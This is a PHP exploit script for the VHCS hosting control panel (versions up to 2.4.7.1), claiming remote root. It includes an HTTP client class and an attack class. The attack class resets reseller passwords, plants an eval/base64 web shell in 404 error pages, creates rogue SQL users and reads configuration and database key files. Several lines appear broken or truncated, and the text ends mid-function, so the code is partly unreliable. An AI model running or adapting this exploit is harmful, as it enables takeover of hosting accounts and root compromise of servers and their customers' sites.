VHCS <= 2.4.7.1 (vhcs2_daemon) Remote Root Exploit
==================================================

#!/usr/bin/php -q
<?php
error_reporting(E_ALL ^ E_NOTICE);
#
#
# darkfig@darky:/# ./vhcs_sploit.php -url http://localhost/vhcs2/
#
#  VHCS <= 2.4.7.1 (vhcs2_daemon) Remote Root Exploit
#  --------------------------------------------------
# 
# About:
#  by DarkFig < gmdarkfig (at) gmail (dot) com >
#  http://acid-root.new.fr/
#  #acidroot@irc.worldnet.net
# 
# Exploit:
#  + Logged in (Administrator)
#  + The administrator has 2 resellers
#  / Changing dareseller&#039;s password
#  / Trying to connect as dareseller:thatpwnz
#  + Login successful
#  + The reseller has 2 users
#  + Host domaintest.fr is connected
#  / Trying to write PHP code
#  + PHP code successfully written
#  / We&#039;ll have to bypass open_basedir cause safe_mode=On
#  - User  doesn&#039;t have SQL rights
#  / Host domaintest.fr isn&#039;t a valid user
#  + Host xpliamaclient.com is connected
#  / Trying to write PHP code
#  + PHP code successfully written
#  / We&#039;ll have to bypass open_basedir cause safe_mode=On
#  - User  doesn&#039;t have SQL rights
#  / Host xpliamaclient.com isn&#039;t a valid user
#  / Changing unautresel&#039;s password
#  / Trying to connect as unautresel:thatpwnz
#  + Login successful
#  + The reseller has 1 users
#  + Host thegoodone.com is connected
#  / Trying to write PHP code
#  + PHP code successfully written
#  / We&#039;ll have to bypass open_basedir cause safe_mode=On
#  / Trying to create a database
#  + Database 92xpl_db39 successfully created
#  + Using database id 12
#  / Trying to add SQL user
#  + User 93xpl_usr2 successfully created
#  + Using SQL user id 17
#  + Host thegoodone.com is a valid user
#  + Logged in (thegoodone.com - Client)
#  / Trying to load files via local_infile
#  + Ok: /etc/vhcs2/vhcs2.conf
#  + Ok: /var/www/vhcs2/gui/include/vhcs2-db-keys.php
#  + Now you can execute commands as root =]
#  + root@thegoodone.com: id
# 
# uid=0(root) gid=0(root)
#

##############################################
# THE VHCS CODE IS AFTER THE PHPSPLOIT CLASS
##############################################


/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 4 / PHP 5
 * VERSION:        2.0
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 *
 * [2007-06-10] (2.0)
 *  * Code: Code optimization
 *  * New: Compatible with PHP 4 by default
 *
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit
{
	var $proxyhost;
	var $proxyport;
	var $host;
	var $path;
	var $port;
	var $method;
	var $url;
	var $packet;
	var $proxyuser;
	var $proxypass;
	var $header;
	var $cookie;
	var $data;
	var $boundary;
	var $allowredirection;
	var $last_redirection;
	var $cookiejar;
	var $recv;
	var $cookie_str;
	var $header_str;
	var $server_content;
	var $server_header;
	

	/**
	 * This function is called by the
	 * get()/post()/formdata() functions.
	 * You don&#039;t have to call it, this is
	 * the main function.
	 *
	 * @access private
	 * @return string $this->recv ServerResponse
	 * 
	 */
	function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport))
		   $socket = @fsockopen($this->proxyhost,$this->proxyport);
		else
		   $socket = @fsockopen($this->host,$this->port);
		
		if(!$socket)
		   die("Error: Host seems down");
		
		if($this->method==&#039;get&#039;)
		   $this->packet = &#039;GET &#039;.$this->url." HTTP/1.1\r\n";
		   
		elseif($this->method==&#039;post&#039; or $this->method==&#039;formdata&#039;)
		   $this->packet = &#039;POST &#039;.$this->url." HTTP/1.1\r\n";
		   
		else
		   die("Error: Invalid method");
		
		if(!empty($this->proxyuser))
		   $this->packet .= &#039;Proxy-Authorization: Basic &#039;.base64_encode($this->proxyuser.&#039;:&#039;.$this->proxypass)."\r\n";
		
		if(!empty($this->header))
		   $this->packet .= $this->showheader();
		   
		if(!empty($this->cookie))
		   $this->packet .= &#039;Cookie: &#039;.$this->showcookie()."\r\n";
	
		$this->packet .= &#039;Host: &#039;.$this->host."\r\n";
		$this->packet .= "Connection: Close\r\n";
		
		if($this->method==&#039;post&#039;)
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= &#039;Content-Length: &#039;.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method==&#039;formdata&#039;)
		{
			$this->packet .= &#039;Content-Type: multipart/form-data; boundary=&#039;.str_repeat(&#039;-&#039;,27).$this->boundary."\r\n";
			$this->packet .= &#039;Content-Length: &#039;.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}

		$this->packet .= "\r\n";
		$this->recv = &#039;&#039;;

		fputs($socket,$this->packet);

		while(!feof($socket))
		   $this->recv .= fgets($socket);

		fclose($socket);

		if($this->cookiejar)
		   $this->getcookie();

		if($this->allowredirection)
		   return $this->getredirection();
		else
		   return $this->recv;
	}
	

	/**
	 * This function allows you to add several
	 * cookies in the request.
	 * 
	 * @access  public
	 * @param   string cookn CookieName
	 * @param   string cookv CookieValue
	 * @example $this->addcookie(&#039;name&#039;,&#039;value&#039;)
	 * 
	 */
	function addcookie($cookn,$cookv)
	{
		if(!isset($this->cookie))
		   $this->cookie = array();

		$this->cookie[$cookn] = $cookv;
	}


	/**
	 * This function allows you to add several
	 * headers in the request.
	 *
	 * @access  public
	 * @param   string headern HeaderName
	 * @param   string headervalue Headervalue
	 * @example $this->addheader(&#039;Client-IP&#039;, &#039;128.5.2.3&#039;)
	 * 
	 */
	function addheader($headern,$headervalue)
	{
		if(!isset($this->header))
		   $this->header = array();
		   
		$this->header[$headern] = $headervalue;
	}


	/**
	 * This function allows you to use an
	 * http proxy server. Several methods
	 * are supported.
	 * 
	 * @access  public
	 * @param   string proxy ProxyHost
	 * @param   integer proxyp ProxyPort
	 * @example $this->proxy(&#039;localhost&#039;,8118)
	 * @example $this->proxy(&#039;localhost:8118&#039;)
	 * 
	 */
	function proxy($proxy,$proxyp=&#039;&#039;)
	{
		if(empty($proxyp))
		{
			$proxarr = explode(&#039;:&#039;,$proxy);
			$this->proxyhost = $proxarr[0];
			$this->proxyport = (int)$proxarr[1];
		}
		else 
		{
			$this->proxyhost = $proxy;
			$this->proxyport = (int)$proxyp;
		}

		if($this->proxyport > 65535)
		   die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an
	 * http proxy server which requires a
	 * basic authentification. Several
	 * methods are supported:
	 *
	 * @access  public
	 * @param   string proxyauth ProxyUser
	 * @param   string proxypass ProxyPass
	 * @example $this->proxyauth(&#039;user&#039;,&#039;pwd&#039;)
	 * @example $this->proxyauth(&#039;user:pwd&#039;);
	 * 
	 */
	function proxyauth($proxyauth,$proxypass=&#039;&#039;)
	{
		if(empty($proxypass))
		{
			$posvirg = strpos($proxyauth,&#039;:&#039;);
			$this->proxyuser = substr($proxyauth,0,$posvirg);
			$this->proxypass = substr($proxyauth,$posvirg+1);
		}
		else
		{
			$this->proxyuser = $proxyauth;
			$this->proxypass = $proxypass;
		}
	}


	/**
	 * This function allows you to set
	 * the &#039;User-Agent&#039; header.
	 * 
	 * @access  public
	 * @param   string useragent Agent
	 * @example $this->agent(&#039;Firefox&#039;)
	 * 
	 */
	function agent($useragent)
	{
		$this->addheader(&#039;User-Agent&#039;,$useragent);
	}

	
	/**
	 * This function returns the headers
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->header_str Headers
	 * @example $this->showheader()
	 * 
	 */
	function showheader()
	{
		$this->header_str = &#039;&#039;;
		
		if(!isset($this->header))
		   return;
		   
		foreach($this->header as $name => $value)
		   $this->header_str .= $name.&#039;: &#039;.$value."\r\n";
		   
		return $this->header_str;
	}

	
	/**
	 * This function returns the cookies
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->cookie_str Cookies
	 * @example $this->showcookie()
	 * 
	 */
	function showcookie()
	{
		$this->cookie_str = &#039;&#039;;
		
		if(!isset($this->cookie))
		   return;
		
		foreach($this->cookie as $name => $value)
		   $this->cookie_str .= $name.&#039;=&#039;.$value.&#039;; &#039;;

		return $this->cookie_str;
	}


	/**
	 * This function returns the last
	 * formed http request.
	 * 
	 * @access  public
	 * @return  string $this->packet HttpPacket
	 * @example $this->showlastrequest()
	 * 
	 */
	function showlastrequest()
	{
		if(!isset($this->packet))
		   return;
		else
		   return $this->packet;
	}


	/**
	 * This function sends the formed
	 * http packet with the GET method.
	 * 
	 * @access  public
	 * @param   string url Url
	 * @return  string $this->sock()
	 * @example $this->get(&#039;localhost/index.php?var=x&#039;)
	 * @example $this->get(&#039;http://localhost:88/tst.php&#039;)
	 * 
	 */
	function get($url)
	{
		$this->target($url);
		$this->method = &#039;get&#039;;
		return $this->sock();
	}

	
	/**
	 * This function sends the formed
	 * http packet with the POST method.
	 *
	 * @access  public
	 * @param   string url  Url
	 * @param   string data PostData
	 * @return  string $this->sock()
	 * @example $this->post(&#039;http://localhost/&#039;,&#039;helo=x&#039;)
	 * 
	 */	
	function post($url,$data)
	{
		$this->target($url);
		$this->method = &#039;post&#039;;
		$this->data = $data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http
	 * packet with the POST method using
	 * the multipart/form-data enctype.
	 * 
	 * @access  public
	 * @param   array array FormDataArray
	 * @return  string $this->sock()
	 * @example $formdata = array(
	 *                      frmdt_url => &#039;http://localhost/upload.php&#039;,
	 *                      frmdt_boundary => &#039;123456&#039;, # Optional
	 *                      &#039;var&#039; => &#039;example&#039;,
	 *                      &#039;file&#039; => array(
	 *                                frmdt_type => &#039;image/gif&#039;,  # Optional
	 *                                frmdt_transfert => &#039;binary&#039; # Optional
	 *                                frmdt_filename => &#039;hello.php,
	 *                                frmdt_content => &#039;<?php echo 1; ?>&#039;));
	 *          $this->formdata($formdata);
	 * 
	 */
	function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method = &#039;formdata&#039;;
		$this->data = &#039;&#039;;
		
		if(!isset($array[frmdt_boundary]))
		   $this->boundary = &#039;phpsploit&#039;;
		else
		   $this->boundary = $array[frmdt_boundary];

		foreach($array as $key => $value)
		{
			{
				$this->data .= str_repeat(&#039;-&#039;,29).$this->boundary."\r\n";
				$this->data .= &#039;Content-Disposition: form-data; name="&#039;.$key.&#039;";&#039;;
				
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= &#039; filename="&#039;.$array[$key][frmdt_filename]."\";\r\n";

					if(isset($array[$key][frmdt_type]))
					   $this->data .= &#039;Content-Type: &#039;.$array[$key][frmdt_type]."\r\n";

					if(isset($array[$key][frmdt_transfert]))
					   $this->data .= &#039;Content-Transfer-Encoding: &#039;.$array[$key][frmdt_transfert]."\r\n";

					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}

		$this->data .= str_repeat(&#039;-&#039;,29).$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content
	 * of the server response, without
	 * the headers.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_content
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->get(&#039;http://localhost/&#039;))
	 * 
	 */
	function getcontent($code=&#039;&#039;)
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_content = &#039;&#039;;
		
		for($i=1;$i<count($code);$i++)
		   $this->server_content .= $code[$i];

		return $this->server_content;
	}

	
	/**
	 * This function returns the headers
	 * of the server response, without
	 * the content.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_header
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->post(&#039;http://localhost/&#039;,&#039;1=2&#039;))
	 * 
	 */
	function getheader($code=&#039;&#039;)
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_header = $code[0];
		
		return $this->server_header;
	}

	
	/**
	 * This function is called by the
	 * cookiejar() function. It adds the
	 * value of the "Set-Cookie" header
	 * in the "Cookie" header for the
	 * next request. You don&#039;t have to
	 * call it.
	 * 
	 * @access private
	 * @param  string code ServerResponse
	 * 
	 */
	function getcookie()
	{
		foreach(explode("\r\n",$this->getheader()) as $header)
		{
			{
				$fequal = strpos($header,&#039;=&#039;);
				$fvirgu = strpos($header,&#039;;&#039;);
				
				// 12=strlen(&#039;set-cookie: &#039;)
				$cname  = substr($header,12,$fequal-12);
				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
				
				$this->cookie[trim($cname)] = trim($cvalu);
			}
		}
	}


	/**
	 * This function is called by the
	 * get()/post() functions. You
	 * don&#039;t have to call it.
	 *
	 * @access  private
	 * @param   string urltarg Url
	 * @example $this->target(&#039;http://localhost/&#039;)
	 * 
	 */
	function target($urltarg)
	{
		if(!ereg(&#039;^http://&#039;,$urltarg))
		   $urltarg = &#039;http://&#039;.$urltarg;
		   
		$urlarr     = parse_url($urltarg);
		$this->url  = &#039;http://&#039;.$urlarr[&#039;host&#039;].$urlarr[&#039;path&#039;];
		
		if(isset($urlarr[&#039;query&#039;]))
		   $this->url .= &#039;?&#039;.$urlarr[&#039;query&#039;];
		
		$this->port = !empty($urlarr[&#039;port&#039;]) ? $urlarr[&#039;port&#039;] : 80;
		$this->host = $urlarr[&#039;host&#039;];
		
		if($this->port != &#039;80&#039;)
		   $this->host .= &#039;:&#039;.$this->port;

		if(!isset($urlarr[&#039;path&#039;]) or empty($urlarr[&#039;path&#039;]))

		$this->path = substr($urlarr[&#039;path&#039;],0,strrpos($urlarr[&#039;path&#039;],&#039;/&#039;)+1);

		if($this->port > 65535)
		   die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function,
	 * the script will extract all
	 * &#039;Set-Cookie&#039; headers values
	 * and it will automatically add
	 * them into the &#039;Cookie&#039; header
	 * for all next requests.
	 *
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->cookiejar(0)
	 * @example $this->cookiejar(1)
	 * 
	 */
	function cookiejar($code)
	{
		if($code==&#039;0&#039;)
		   $this->cookiejar=FALSE;

		elseif($code==&#039;1&#039;)
		   $this->cookiejar=TRUE;
	}


	/**
	 * If you call this function,
	 * the script will follow all
	 * redirections sent by the server.
	 * 
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->allowredirection(0)
	 * @example $this->allowredirection(1)
	 * 
	 */
	function allowredirection($code)
	{
		if($code==&#039;0&#039;)
		   $this->allowredirection=FALSE;
		   
		elseif($code==&#039;1&#039;)
		   $this->allowredirection=TRUE;
	}

	
	/**
	 * This function is called if
	 * allowredirection() is enabled.
	 * You don&#039;t have to call it.
	 *
	 * @access private
	 * @return string $this->get(&#039;http://&#039;.$this->host.$this->path.$this->last_redirection)
	 * @return string $this->get($this->last_redirection)
	 * @return string $this->recv;
	 * 
	 */
	function getredirection()
	{
		{
			$this->last_redirection = trim($codearr[2]);
			
			if(!ereg(&#039;://&#039;,$this->last_redirection))
			   return $this->get(&#039;http://&#039;.$this->host.$this->path.$this->last_redirection);

			else
			   return $this->get($this->last_redirection);
		}
		else
		   return $this->recv;
	}


	/**
	 * This function allows you
	 * to reset some parameters.
	 * 
	 * @access  public
	 * @param   string func Param
	 * @example $this->reset(&#039;header&#039;)
	 * @example $this->reset(&#039;cookie&#039;)
	 * @example $this->reset()
	 * 
	 */
	function reset($func=&#039;&#039;)
	{
		switch($func)
		{
			case &#039;header&#039;:
			$this->header = array(&#039;&#039;);
			break;
				
			case &#039;cookie&#039;:
			$this->cookie = array(&#039;&#039;);
			break;
				
			default:
			$this->cookiejar = &#039;&#039;;
			$this->header = array(&#039;&#039;);
			$this->cookie = array(&#039;&#039;);
			$this->allowredirection = &#039;&#039;;
			break;
		}
	}
}


class vhcs_xpl extends phpsploit
{
	var $sleep_time = 4;

	#  -rw-r--r-- 1 root root
	var $conf_path = &#039;/etc/vhcs2/vhcs2.conf&#039;;

	# -r-------- 1 www-data www-data
	var $keys_path = &#039;/var/www/vhcs2/gui/include/vhcs2-db-keys.php&#039;;

	var $head_arr = array(
            &#039;admin/index.php&#039;       => 3,
	    &#039;reseller/index.php&#039;    => 2,
	    &#039;../reseller/index.php&#039; => 2,
	    &#039;client/index.php&#039;      => 1,
	    &#039;&#039;	                    => 0);

	var $privileges = array(
	    3 => &#039;Administrator&#039;,
	    2 => &#039;Reseller&#039;,
	    1 => &#039;Client&#039;);

	var $reg_arr = array(
            1 => &#039;#edit_reseller\.php\?edit_id=([0-9]+)" class="link">(.*) </a> </td>#i&#039;,
	    2 => &#039;#edit_user.php\?edit_id=([0-9]+)" class="link">(.*)</a></td>#i&#039;,
	    3 => &#039;#delete_sql_database\.php\?id=([0-9]+)#i&#039;,
	    4 => &#039;#delete_sql_database\.php\?id=([0-9]+)#i&#039;,
	    5 => &#039;#sql_execute_query.php\?id=([0-9]+)#i&#039;);

	var $flags = array(
	   -1 => &#039;-&#039;,
	    0 => &#039;/&#039;,
	    1 => &#039;+&#039;);

	function main()
	{
		$this->agent(&#039;Mozilla Firefox&#039;);
		$this->cookiejar(1);

		$this->mhead();

		$this->uri      = $this->getparam(&#039;url&#039;, TRUE);
		$this->url_arr  = parse_url($this->uri);

		$this->patch = $this->getparam(&#039;patch&#039;);
		$this->proxh = $this->getparam(&#039;proxhost&#039;);
		$this->proxa = $this->getparam(&#039;proxauth&#039;);

		if($this->proxh)
		   $this->proxy($this->proxh);

		if($this->proxa)
		   $this->proxyauth($this->proxa);

		print "\nExploit:";
		$this->type = $this->login();

		if(empty($this->type))
		{
			if(!$this->patch)
			{
				$this->msg(&#039;A patch has been applied to this website&#039;, -1);
				$this->msg("See RoMaNSoFt&#039;s advisory for more details", -1);
				$this->msg(&#039;Try with the -patch option&#039;, -1, 1);
			}
			else
			   $this->msg(&#039;Bad username/password&#039;, -1, 1);
		}

		$this->msg("Logged in (".$this->usr.&#039; - &#039;.$this->privileges[$this->type].&#039;)&#039;, 1);

		$this->allowredirection(1);

		$this->get_vhcs_conf();

		$this->exec_cmd();

		return;
	}


	function getparam($param, $nec=FALSE)
	{
		global $argv;

		foreach($argv as $value => $key)
		{
			if($key === &#039;-&#039;.$param)
			   return $argv[$value+1];
		}

		if($nec)
		   $this->usage();
		
		return FALSE;
	}

	function mhead()
	{
		print "\n VHCS <= 2.4.7.1 (vhcs2_daemon) Remote Root Exploit";
		print "\n --------------------------------------------------\n";
		print "\nAbout:";
		print "\n by DarkFig < gmdarkfig (at) gmail (dot) com >";
		print "\n http://acid-root.new.fr/";
		print "\n #acidroot@irc.worldnet.net";
		print "\n";
	
		return;
	}
	
	function usage()
	{
		print "\nUsage:";
		print "\n vhcsxpl.php -url <url> [options...]\n";
		print "\nOptions:";
		print "\n -patch <user:pwd>     Unofficial patch applied";
		print "\n -proxhost <ip>        If you wanna use a proxy";
		print "\n -proxauth <usr:pwd>   Proxy with authentication\n";
		print "\n";
	
		exit(1);
	}

	function log_as()
	{
		$this->msg("Trying to connect as ".$this->usr.&#039;:&#039;.$this->pwd, 0);
		$this->allowredirection(1);

		$this->post($this->uri.&#039;chk_login.php&#039;,
		&#039;uname=&#039;.$this->usr.&#039;&upass=&#039;.$this->pwd.&#039;&Submit=+++Login+++&#039;);

		$this->redir_type = $this->get_type_by_redir();

		if($this->redir_type == 0)
		   $this->msg(&#039;Login attempt failed&#039;, -1);

		else
		   $this->msg(&#039;Login successful&#039;, 1);

		return $this->redir_type;
	}

	function get_type_by_redir()
	{
		$this->redir_arr = parse_url($this->last_redirection);
			
		$this->allowredirection(0);

		return $this->head_arr[$this->redir_arr[&#039;path&#039;]];
	}
	
	function login()
	{
		if($this->patch)
		{
			$this->idents = explode(&#039;:&#039;, $this->patch);
			list($this->usr, $this->pwd) =	$this->idents;

			$this->type = $this->log_as();

			return $this->log_as_user();
		}
		else
		{
			$this->get($this->uri.&#039;admin/manage_users.php&#039;);

			$this->type = 3;

			if(ereg(&#039;add_user\.php&#039;, $this->getcontent()))
			   return $this->log_as_user();

			else
			   return 0;
		}
	}

	function log_as_user()
	{
		if($this->type == 3)
		   $this->logged_as_admin();

		if($this->type == 2)
		   $this->logged_as_reseller();

		if($this->type == 1)
		{
			if(!$this->patch)
			   return 1;

			else
			   return $this->valid_user();
		}

		else
		   return 0;
	}

	function valid_user()
	{
		if($this->write_code())
		{
			# open_basedir + safe_mode
			if($this->is_safe())
			{
				if($this->bypass_with_db())
				   return 1;

				else
				   return 0;
			}
			else
			   return 1;
		}
		return 0;		
	}

	function logged_as_admin()
	{
		$this->msg(&#039;Logged in (&#039;.$this->privileges[3].&#039;)&#039;, 1);

		$this->get($this->uri.&#039;admin/manage_users.php&#039;);


		$this->reseller_count = count($resellers[1]);

		$this->msg(&#039;The administrator has &#039;.$this->reseller_count.&#039; resellers&#039;, 1);

		for($i=0; $i<$this->reseller_count; $i++)
		{	
			$this->usr = $resellers[2][$i];
			$this->pwd = &#039;thatpwnz&#039;;

			if(!$this->patch)
		   	{
				$this->msg(&#039;Changing &#039;.$resellers[2][$i]."&#039;s password", 0);

				$this->reseller_dat = &#039;&#039;;

				$this->get($this->uri.&#039;admin/edit_reseller.php?edit_id=&#039;.$resellers[1][$i]);

				# only checked ip
				$this->getcontent(), $reseller_ips);

				$this->ip_count = count($reseller_ips[1]);
				$this->ip_dat = &#039;&#039;;

				for($j=0; $j<$this->ip_count; $j++)
				{
					$this->ip_dat .= &#039;ip_&#039;.$reseller_ips[1][$j].&#039;=asgned&#039;;

		   	 		if($j != $this->ip_count-1)
		  	    		   $this->ip_dat .= &#039;&&#039;;
				}

				# Change reseller&#039;s password/mail
				# This is needed if it was run without -path
				# Because we can&#039;t click on the &#039;Change&#039; button.
				#
				# pwd: thatpwnz
				# mail: <reseller_name>@ohyeah.com
				#
				$this->post($this->uri.&#039;admin/edit_reseller.php&#039;,
				&#039;username=&#039;.$resellers[2][$i].&#039;&pass=thatpwnz&&#039;.
				&#039;pass_rep=thatpwnz&email=&#039;.$resellers[2][$i].&#039;&#039;.
				&#039;%40ohyeah.com&nreseller_max_domain_cnt=0&nres&#039;.
				&#039;eller_max_subdomain_cnt=0&nreseller_max_alias&#039;.
				&#039;_cnt=0&nreseller_max_mail_cnt=0&nreseller_max&#039;.
				&#039;_ftp_cnt=0&nreseller_max_sql_db_cnt=0&nresell&#039;.
				&#039;er_max_sql_user_cnt=0&nreseller_max_traffic=0&#039;.
				&#039;&nreseller_max_disk=0&&#039;.$this->ip_dat.&#039;&custo&#039;.
				&#039;mer_id=&fname=&lname=&firm=&zip=&city=&countr&#039;.
				&#039;y=&street1=&street2=&phone=&fax=&Submit=++Upd&#039;.
				&#039;ate++&uaction=update_reseller&edit_id=&#039;.
				$resellers[1][$i].&#039;&edit_username=&#039;.
				$resellers[2][$i]);

				if($this->log_as() != 2)
				   return 0;
			}
			else
			{
				$this->allowredirection(1);

				$this->get($this->uri.&#039;admin/change_user_interface.php?to_id=&#039;.$resellers[1][$i]);

				if($this->get_type_by_redir() != 2)
				   return 0;
			}

			if($this->logged_as_reseller())
			   return 1;

			$this->reset(&#039;cookie&#039;);
			$this->get($this->uri.&#039;reseller/change_user_interface.php?action=go_back&#039;);
		}

		return 0;
	}

	function logged_as_reseller()
	{
		$this->get($this->uri.&#039;reseller/users.php&#039;);

		
		array_walk($users[2], &#039;trim&#039;);
		
		$this->user_count = count($users[1]);
		
		$this->msg(&#039;The reseller has &#039;.$this->user_count. &#039; users&#039;, 1);

		$this->patch = FALSE;

		for($i=0; $i<$this->user_count; $i++)
		{
			if($this->is_alive($users[2][$i]))
			{
				$this->usr = $users[2][$i];

				$this->type = 1;

				$this->msg(&#039;Host &#039;.$this->usr.&#039; is connected&#039;, 1);

				$this->get($this->uri.&#039;reseller/change_user_interface.php?to_id=&#039;.$users[1][$i]);

				if($this->valid_user())
				{
					$this->msg(&#039;Host &#039;.$this->usr.&#039; is a valid user&#039;, 1);
					return TRUE;
				}
				else
				   $this->msg("Host ".$this->usr." isn&#039;t a valid user", 0);
			}
			else
			   $this->msg(&#039;Host &#039;.$users[2][$i].&#039; seems down&#039;, -1);

			$this->get($this->uri.&#039;client/change_user_interface.php?action=go_back&#039;);
		}

		return FALSE;
	}

	function bypass_with_db()
	{
		$this->get($this->dmn_vhcs_url.&#039;client/index.php&#039;);

		if(!ereg(&#039;manage_sql.php&#039;, $this->getcontent()) and !$edit)
		{
			$this->msg("User ".$this->ur." doesn&#039;t have SQL rights", -1);

			return FALSE;
		}
		
		# No database
		if(!$this->got_db())
		{
			$this->msg(&#039;Trying to create a database&#039;, 0);

			$this->tmp_db_name = rand(0,100).&#039;xpl_db&#039;.rand(0,100);

			# Database: ..xpl_db..
			$this->post($this->dmn_vhcs_url.&#039;client/add_sql_database.php&#039;,
			&#039;db_name=&#039;.$this->tmp_db_name.&#039;&id_pos=start&Submit=++Add++&&#039;.
			&#039;uaction=add_db&#039;);

			if($this->got_db())
			   $this->msg(&#039;Database &#039;.$this->tmp_db_name.&#039; successfully created&#039;, 1);

			else
			{
				$this->msg("Can&#039;t create the database ".$this->tmp_db_name, 0);

				return FALSE;
			}
		}

		# First database
		$this->db_id = $this->sql_db_ids[1];

		$this->msg(&#039;Using database id &#039;.$this->db_id, 1);

		if(!$this->got_db_user())
		{
			$this->msg(&#039;Trying to add SQL user&#039;, 0);

			$this->tmp_db_user = rand(0,100).&#039;xpl_usr&#039;.rand(0,100);
			
			# SQL user: ..xpl_usr..:xpl_pwd
			$this->post($this->dmn_vhcs_url.&#039;client/sql_add_user.php&#039;,
			&#039;user_name=&#039;.$this->tmp_db_user.&#039;&id_pos=end&pass=xpl_pw&#039;.
			&#039;d&pass_rep=xpl_pwd&Add_New=++Add++&uaction=add_user&id=&#039;.
			$this->db_id);

			if($this->got_db_user())
			   $this->msg(&#039;User &#039;.$this->tmp_db_user.&#039; successfully created&#039;, 1);

			else
			{
				$this->msg("Can&#039;t create the SQL user ".$this->tmp_db_user, 0);

				return FALSE;
			}
		}

		# First SQL user id associed with the database
		$this->db_user_id = $this->sql_usrs[1];

		$this->msg(&#039;Using SQL user id &#039;.$this->db_user_id, 1);

		return TRUE;
	}

	function got_db_user()
	{		
		$this->get($this->dmn_vhcs_url.&#039;client/manage_sql.php&#039;);

		$this->content_arr = explode("\n", $this->getcontent());

		$this->is_sql_db_usr = FALSE;

		for($i=0; $i<count($this->content_arr); $i++)
		{
			$this->content_arr[$i], $this->sql_db_id))
			{
				if($this->sql_db_id[1] == $this->db_id)
				   $this->is_sql_db_usr = TRUE;

				else
				   $this->is_sql_db_usr = FALSE;
			}

			$this->content_arr[$i], $this->sql_usrs))
			{
				if($this->is_sql_db_usr)
				   return TRUE;
			}
		}
		return FALSE;
	}

	function got_db()
	{	
		$this->get($this->dmn_vhcs_url.&#039;client/manage_sql.php&#039;);

		$this->getcontent(), $this->sql_db_ids);

		if(empty($this->sql_db_ids))
		   return FALSE;

		else
		   return TRUE;
	}

	function is_alive($domain_name)
	{
		if(gethostbyname($domain_name) != $domain_name)
		   return TRUE;

		else
		   return FALSE;
	}

	function write_code()
	{
		$this->msg(&#039;Trying to write PHP code&#039;, 0);

		$this->dmn_url      = &#039;http://&#039;.$this->usr;
		$this->dmn_vhcs_url = $this->dmn_url.$this->url_arr[&#039;path&#039;];

		$this->get($this->dmn_url.&#039;/errors/404/index.php&#039;);
		$this->old_404 = $this->getcontent();

		$this->phpc =
		 &#039;<?php &#039;
		.&#039;error_reporting(0); &#039;
		.&#039;if(isset($_SERVER[\&#039;HTTP_SHELL\&#039;])) &#039;
		.&#039;{ eval(base64_decode($_SERVER[\&#039;HTTP_SHELL\&#039;])); exit(0); } &#039;
		.&#039;?>&#039;;

		$this->new_404 = $this->phpc.$this->old_404;

		$this->post($this->dmn_vhcs_url.&#039;client/error_pages.php&#039;,
		&#039;error=&#039;.urlencode($this->new_404).&#039;&uaction=updt_error&eid=404&Submit=+Save+&#039;);

		$this->exec_php(&#039;print "itworkz";&#039;);

		if(ereg(&#039;itworkz&#039;, $this->getcontent()))
		{
			$this->msg(&#039;PHP code successfully written&#039;, 1);

			return TRUE;
		}
		else
		{
			$this->msg("Can&#039;t write PHP code", -1);

		   	return FALSE;
		}
	}

	function get_vhcs_conf()
	{
		if($this->safe_mode)
		   $this->msg(&#039;Trying to load files via local_infile&#039;, 0);

		else
